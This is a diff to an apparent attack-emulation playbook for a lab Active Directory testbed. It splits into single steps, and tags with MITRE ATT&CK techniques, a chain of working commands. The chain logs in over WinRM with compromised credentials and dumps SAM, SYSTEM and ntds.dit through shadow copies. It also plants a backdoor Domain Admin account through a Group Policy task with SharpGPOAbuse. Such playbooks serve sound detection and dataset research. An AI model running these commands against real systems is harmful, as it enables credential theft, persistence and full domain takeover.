@@ -12,6 +12,9 @@ vars:
   MSF_PAYLOAD: windows/x64/meterpreter/reverse_tcp
 
 commands:
+  - type: sleep
+    seconds: 600
+
   - type: shell
     cmd: "evil-winrm -i $IP_WEB -u $COMPROMISED_USER_USERNAME -p '$COMPROMISED_USER_PASSWORD'\n"
     command_timeout: 30
@@ -190,13 +193,77 @@ commands:
   - type: shell
     session: winrm_domain_admin
     interactive: true
-    cmd: "$Username = \"$COMPROMISED_ADMIN_USERNAME\"; $Password = \"$COMPROMISED_ADMIN_PASSWORD\"; $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force; $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword); $Session = New-PSSession -ComputerName DC1 -Credential $Credential;\n"
+    cmd: "$Username = \"$COMPROMISED_ADMIN_USERNAME\";\n"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "$Password = \"$COMPROMISED_ADMIN_PASSWORD\";\n"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force;\n"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "$Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword);\n"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "$Session = New-PSSession -ComputerName DC1 -Credential $Credential;\n"
+    metadata:
+      techniques: "T1021.006"
+      tactics: "Lateral Movement"
+      technique_name: "Remote Services: Windows Remote Management"
 
   - type: shell
     session: winrm_domain_admin
     interactive: true
     command_timeout: 30
-    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { reg.exe save HKLM\\SYSTEM C:\\Users\\Public\\SYSTEM.hive /y; reg.exe save HKLM\\SAM C:\\Users\\Public\\SAM.hive /y; vssadmin CREATE SHADOW /For=C:; $ShadowCopyVolume = (vssadmin list shadows | Select-String \"Shadow Copy Volume:\" | Select-Object -First 1).ToString().Split(\":\")[1].Trim(); cmd.exe /c copy $ShadowCopyVolume\\Windows\\NTDS\\ntds.dit c:\\Users\\Public\\ntds.dit; vssadmin delete shadows /All /Quiet }\n"
+    cmd: "Invoke-Command -Session $Session -ScriptBlock { reg.exe save HKLM\\SYSTEM C:\\Users\\Public\\SYSTEM.hive /y; }\n"
+    metadata:
+      techniques: "T1006"
+      tactics: "Defense Evasion, Credential Access"
+      technique_name: "Direct Volume Access"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    command_timeout: 30
+    cmd: "Invoke-Command -Session $Session -ScriptBlock { reg.exe save HKLM\\SAM C:\\Users\\Public\\SAM.hive /y; }\n"
+    metadata:
+      techniques: "T1006"
+      tactics: "Defense Evasion, Credential Access"
+      technique_name: "Direct Volume Access"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    command_timeout: 30
+    cmd: "Invoke-Command -Session $Session -ScriptBlock { vssadmin CREATE SHADOW /For=C:; }\n"
+    metadata:
+      techniques: "T1006"
+      tactics: "Defense Evasion, Credential Access"
+      technique_name: "Direct Volume Access"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    command_timeout: 30
+    cmd: "Invoke-Command -Session $Session -ScriptBlock { $ShadowCopyVolume = (vssadmin list shadows | Select-String \"Shadow Copy Volume:\" | Select-Object -First 1).ToString().Split(\":\")[1].Trim(); cmd.exe /c copy $ShadowCopyVolume\\Windows\\NTDS\\ntds.dit c:\\Users\\Public\\ntds.dit; }\n"
+    metadata:
+      techniques: "T1006"
+      tactics: "Defense Evasion, Credential Access"
+      technique_name: "Direct Volume Access"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    command_timeout: 30
+    cmd: "Invoke-Command -Session $Session -ScriptBlock { vssadmin delete shadows /All /Quiet; }\n"
     metadata:
       techniques: "T1006"
       tactics: "Defense Evasion, Credential Access"
@@ -220,7 +287,17 @@ commands:
   - type: shell
     session: winrm_domain_admin
     interactive: true
-    cmd: "Copy-Item -Path C:\\Users\\Public\\SAM.hive -FromSession $Session -Destination C:\\Users\\Public\\; Copy-Item -Path C:\\Users\\Public\\SYSTEM.hive -FromSession $Session -Destination C:\\Users\\Public; Copy-Item -Path C:\\Users\\Public\\ntds.dit -FromSession $Session -Destination C:\\Users\\Public;\n"
+    cmd: "Copy-Item -Path C:\\Users\\Public\\SAM.hive -FromSession $Session -Destination C:\\Users\\Public\\;\n"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Copy-Item -Path C:\\Users\\Public\\SYSTEM.hive -FromSession $Session -Destination C:\\Users\\Public\\;\n"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Copy-Item -Path C:\\Users\\Public\\ntds.dit -FromSession $Session -Destination C:\\Users\\Public;\n"
 
   - type: shell
     session: winrm_domain_admin
@@ -263,12 +340,35 @@ commands:
   - type: shell
     session: winrm_domain_admin
     interactive: true
-    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Write-Output \"New-ADUser -Name $BACKDOOR_NAME -AccountPassword (ConvertTo-SecureString 'P@ssword' -AsPlainText -Force) -Enabled 1\" > C:\\Users\\Public\\adduser.ps1; Write-Output \"Add-ADGroupMember -Identity 'Domain Admins' -Members $BACKDOOR_NAME\" >> C:\\Users\\Public\\adduser.ps1; }\n"
+    cmd: "Invoke-Command -Session $Session -ScriptBlock { Write-Output \"New-ADUser -Name $BACKDOOR_NAME -AccountPassword (ConvertTo-SecureString 'P@ssword' -AsPlainText -Force) -Enabled 1\" > C:\\Users\\Public\\adduser.ps1; }\n"
 
   - type: shell
     session: winrm_domain_admin
     interactive: true
-    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { New-GPO -Name \"$BACKDOOR_NAME\"; New-GPLINK -Name \"$BACKDOOR_NAME\" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com'; C:\\Users\\Public\\SharpGPOAbuse.exe --AddComputerTask --GPOName $BACKDOOR_NAME --Author $COMPROMISED_ADMIN_USERNAME --TaskName \"$BACKDOOR_NAME\" --Command 'powershell.exe' --Arguments 'powershell.exe -ep bypass C:\\Users\\Public\\adduser.ps1'; gpupdate /force }\n"
+    cmd: "Invoke-Command -Session $Session -ScriptBlock { Write-Output \"Add-ADGroupMember -Identity 'Domain Admins' -Members $BACKDOOR_NAME\" >> C:\\Users\\Public\\adduser.ps1; }\n"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Invoke-Command -Session $Session -ScriptBlock { New-GPO -Name \"$BACKDOOR_NAME\"; }\n"
+    metadata:
+      techniques: "T1484.001"
+      tactics: "Persistence, Defense Evasion"
+      technique_name: "Domain or Tenant Policy Modification: Group Policy Modification"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Invoke-Command -Session $Session -ScriptBlock { C:\\Users\\Public\\SharpGPOAbuse.exe --AddComputerTask --GPOName $BACKDOOR_NAME --Author $COMPROMISED_ADMIN_USERNAME --TaskName \"$BACKDOOR_NAME\" --Command 'powershell.exe' --Arguments 'powershell.exe -ep bypass C:\\Users\\Public\\adduser.ps1'; }\n"
+    metadata:
+      techniques: "T1484.001"
+      tactics: "Persistence, Defense Evasion"
+      technique_name: "Domain or Tenant Policy Modification: Group Policy Modification"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Invoke-Command -Session $Session -ScriptBlock { gpupdate /force; }\n"
     metadata:
       techniques: "T1484.001"
       tactics: "Persistence, Defense Evasion"
@@ -278,7 +378,17 @@ commands:
   - type: shell
     session: winrm_domain_admin
     interactive: true
-    cmd: "Invoke-Command -Computername DC1 -Credential $Credential -ScriptBlock { Remove-GPLink -Name \"$BACKDOOR_NAME\" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com' -Confirm:0; Remove-GPO -Name \"$BACKDOOR_NAME\" -Confirm:0; Remove-Item C:\\Users\\Public\\*.* -Force }\n"
+    cmd: "Invoke-Command -Session $Session -ScriptBlock { Remove-GPLink -Name \"$BACKDOOR_NAME\" -Target 'OU=DOMAIN CONTROLLERS,DC=aecid-testbed,DC=com' -Confirm:0; }\n"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Invoke-Command -Session $Session -ScriptBlock { Remove-GPO -Name \"$BACKDOOR_NAME\" -Confirm:0; }\n"
+
+  - type: shell
+    session: winrm_domain_admin
+    interactive: true
+    cmd: "Invoke-Command -Session $Session -ScriptBlock { Remove-Item C:\\Users\\Public\\*.* -Force; }\n"
 
     # Optional: Cleanup WEB
   - type: shell
